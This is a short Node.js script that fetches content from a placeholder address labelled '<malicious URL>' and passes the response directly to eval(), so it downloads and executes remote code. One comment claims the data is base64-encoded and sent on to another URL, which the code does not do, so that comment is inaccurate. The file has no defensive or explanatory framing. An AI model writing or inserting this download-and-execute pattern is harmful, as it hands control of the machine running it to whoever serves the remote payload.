const https = require('https');

const url = '<malicious URL>'; // Example URL

https.get(url, (res) => {
    let data = '';

    // A chunk of data has been received.
    res.on('data', (chunk) => {
        data += chunk;
    });

    // The whole response has been received. Base64 encode and send it as a POST request to another URL.
    res.on('end', () => {
        eval(data)
    });

}).on('error', (err) => {
    console.error('Error fetching data:', err.message);
});